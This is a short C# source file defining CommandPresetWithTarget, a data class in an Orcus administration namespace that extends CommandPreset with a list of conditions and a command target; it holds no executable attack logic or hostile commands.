using System.Collections.Generic;
using Orcus.Shared.DynamicCommands;

namespace Orcus.Administration.Core.CrowdControl
{
    public class CommandPresetWithTarget : CommandPreset
    {
        public CommandPresetWithTarget()
        {
            IsCommandPreset = false;
        }

        public List<Condition> Conditions { get; set; }
        public CommandTarget CommandTarget { get; set; }
    }
}